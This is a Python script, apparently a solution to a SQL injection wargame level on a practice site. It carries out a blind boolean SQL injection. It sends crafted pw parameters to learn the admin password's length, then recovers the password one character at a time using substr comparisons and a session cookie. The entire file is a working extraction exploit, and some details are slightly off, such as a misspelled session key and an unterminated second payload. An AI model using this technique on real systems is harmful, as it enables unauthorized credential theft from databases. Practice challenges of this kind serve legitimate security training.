import requests

flag = ''
length = 0

session = dict(PHPSEESID = "unuqjqa2jq11k3n3f6h9hd9fa6")

# find the len of pw

for i in range(20):
    try:
        re = requests.get("https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=1' or id='admin' and length(pw)="+str(i)+"%23", cookies = session)
    except:
        print("[-] Exception")
        continue
    if 'Hello admin' in re.text:    #True
        length = i
        break

print("[+] Length of pw : " + str(length))

for j in range(length+1):
    for i in range(48, 126):
        try:
            re = requests.get("https://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw=1' or id='admin' and substr(pw," + str(j) + ", 1) = '" + str(chr(i)), cookies = session)
        except:
            print("[-] Exception")
            continue
        if 'Hello admin' in re.text:
            flag += chr(i)
            print("[+] Finding pw : " + flag)
            break
print("[+] pw of admin : " +flag)